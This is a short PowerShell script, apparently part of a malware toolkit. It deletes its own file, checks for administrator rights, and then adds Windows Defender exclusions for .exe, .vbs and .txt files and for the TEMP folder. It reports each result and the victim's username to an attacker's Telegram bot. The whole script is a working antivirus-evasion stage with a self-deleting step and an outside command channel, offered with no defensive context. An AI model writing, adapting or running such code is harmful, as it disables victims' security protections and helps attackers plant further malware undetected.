<##>
$token = $args[0];
$chat_id = $args[1];

$filename = $MyInvocation.MyCommand.Definition.ToString();
Remove-Item -Path $filename -Force;

function Send_Message(){
	$url = "https://api.telegram.org/bot" + $token + "/sendMessage?text=" + $message + "%0A--$env:Username--&chat_id=" + $chat_id;
	cmd.exe /c curl `"$url`" -s -k;
}
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $false){
	$message = "%E2%9C%96%EF%B8%8F Need Administrator Privileges";
	Send_Message;
}
else
{
	Add-MpPreference -ExclusionExtension '.exe';
	Add-MpPreference -ExclusionExtension '.vbs';
	Add-MpPreference -ExclusionExtension '.txt';
	Add-MpPreference -ExclusionPath $env:TEMP;
	$message = "%E2%9C%94%20Defender%20Bypass%20Succeeded";
	Send_Message;
}
